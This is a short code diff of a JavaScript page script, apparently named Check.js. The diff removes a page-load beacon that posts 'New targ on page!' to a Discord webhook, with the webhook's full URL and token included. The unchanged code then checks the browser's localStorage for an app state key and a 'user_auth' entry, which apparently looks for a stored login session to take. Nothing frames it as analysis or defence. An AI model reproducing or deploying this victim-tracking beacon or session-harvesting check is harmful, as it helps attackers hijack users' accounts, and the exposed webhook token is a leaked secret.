@@ -1,13 +1,5 @@
 document.addEventListener('DOMContentLoaded', function () {
-  fetch("https://discord.com/api/webhooks/1319108905615360072/NbYWtg6w3QeGxa-peM1nCTFCywROEpY1ekEA0r8-FXBY1qZAyf9Uj4jypyD2E29mCo5z", {
-    body: JSON.stringify({
-      content: `New targ on page!`,
-    }),
-    headers: {
-      "Content-Type": "application/json",
-    },
-    method: "POST",
-  })
+  console.log('Check.js Initialized')
   async function checkLocalStorage() {
     let globalState = localStorage.getItem('tt-global-state');
     if (globalState && localStorage.getItem('user_auth')) {
